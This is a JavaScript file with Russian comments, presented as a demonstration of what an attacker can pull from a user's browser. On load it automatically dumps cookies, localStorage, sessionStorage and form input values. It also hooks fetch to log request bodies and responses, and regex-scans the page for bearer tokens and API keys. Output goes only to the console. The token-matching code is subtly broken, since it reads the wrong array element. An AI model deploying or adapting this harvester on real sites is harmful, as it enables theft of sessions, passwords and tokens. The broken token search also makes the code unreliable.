// Скрипт для извлечения данных из браузера пользователя
// Этот скрипт показывает, что злоумышленник может получить доступ к данным

console.log("=== ЭКСТРАКТОР ДАННЫХ ИЗ БРАУЗЕРА ===");

// 1. Извлечение данных из localStorage
function extractLocalStorage() {
    console.log("🔍 Извлечение данных из localStorage:");
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const value = localStorage.getItem(key);
        console.log(`  ${key}: ${value}`);
    }
}

// 2. Извлечение данных из sessionStorage
function extractSessionStorage() {
    console.log("🔍 Извлечение данных из sessionStorage:");
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        const value = sessionStorage.getItem(key);
        console.log(`  ${key}: ${value}`);
    }
}

// 3. Извлечение cookies
function extractCookies() {
    console.log("🔍 Извлечение cookies:");
    const cookies = document.cookie.split(';');
    cookies.forEach(cookie => {
        const [name, value] = cookie.trim().split('=');
        console.log(`  ${name}: ${value}`);
    });
}

// 4. Извлечение данных из форм
function extractFormData() {
    console.log("🔍 Извлечение данных из форм:");
    const forms = document.querySelectorAll('form');
    forms.forEach((form, index) => {
        console.log(`  Форма ${index + 1}:`);
        const formData = new FormData(form);
        for (let [key, value] of formData.entries()) {
            console.log(`    ${key}: ${value}`);
        }
    });
}

// 5. Извлечение данных из API запросов
function extractAPIRequests() {
    console.log("🔍 Мониторинг API запросов:");
    const originalFetch = window.fetch;
    window.fetch = function(...args) {
        console.log("  API запрос:", args[0]);
        if (args[1] && args[1].body) {
            console.log("  Тело запроса:", args[1].body);
        }
        return originalFetch.apply(this, args).then(response => {
            response.clone().json().then(data => {
                console.log("  Ответ:", data);
            }).catch(() => {});
            return response;
        });
    };
}

// 6. Извлечение данных из React/Redux состояния
function extractReactState() {
    console.log("🔍 Попытка извлечения React состояния:");
    if (window.__REACT_DEVTOOLS_GLOBAL_HOOK__) {
        console.log("  React DevTools доступны");
    }
    
    // Попытка доступа к Redux store
    if (window.__REDUX_DEVTOOLS_EXTENSION__) {
        console.log("  Redux DevTools доступны");
    }
}

// 7. Извлечение данных из переменных окружения
function extractEnvironmentData() {
    console.log("🔍 Извлечение данных окружения:");
    console.log("  User Agent:", navigator.userAgent);
    console.log("  Language:", navigator.language);
    console.log("  Platform:", navigator.platform);
    console.log("  Cookie Enabled:", navigator.cookieEnabled);
    console.log("  Online:", navigator.onLine);
    console.log("  URL:", window.location.href);
    console.log("  Referrer:", document.referrer);
}

// 8. Извлечение данных из мета-тегов
function extractMetaData() {
    console.log("🔍 Извлечение мета-данных:");
    const metaTags = document.querySelectorAll('meta');
    metaTags.forEach(meta => {
        if (meta.name || meta.property) {
            console.log(`  ${meta.name || meta.property}: ${meta.content}`);
        }
    });
}

// 9. Извлечение данных из скриптов
function extractScriptData() {
    console.log("🔍 Извлечение данных из скриптов:");
    const scripts = document.querySelectorAll('script');
    scripts.forEach((script, index) => {
        if (script.src) {
            console.log(`  Скрипт ${index + 1}: ${script.src}`);
        }
        if (script.textContent && script.textContent.length > 0) {
            console.log(`  Встроенный скрипт ${index + 1}: ${script.textContent.substring(0, 100)}...`);
        }
    });
}

// 10. Извлечение данных из API токенов
function extractAPITokens() {
    console.log("🔍 Поиск API токенов:");
    const tokenPatterns = [
        /Bearer\s+([a-zA-Z0-9._-]+)/g,
        /token["\s]*[:=]["\s]*([a-zA-Z0-9._-]+)/g,
        /api[_-]?key["\s]*[:=]["\s]*([a-zA-Z0-9._-]+)/g,
        /auth[_-]?token["\s]*[:=]["\s]*([a-zA-Z0-9._-]+)/g
    ];
    
    const pageContent = document.documentElement.outerHTML;
    tokenPatterns.forEach(pattern => {
        const matches = pageContent.match(pattern);
        if (matches) {
            console.log("  Найден токен:", matches[1]);
        }
    });
}

// Запуск всех функций извлечения
function runDataExtraction() {
    console.log("🚀 Запуск извлечения данных...");
    
    extractLocalStorage();
    extractSessionStorage();
    extractCookies();
    extractFormData();
    extractAPIRequests();
    extractReactState();
    extractEnvironmentData();
    extractMetaData();
    extractScriptData();
    extractAPITokens();
    
    console.log("✅ Извлечение данных завершено");
}

// Автоматический запуск
runDataExtraction();

// Экспорт для использования в консоли
window.extractData = runDataExtraction;
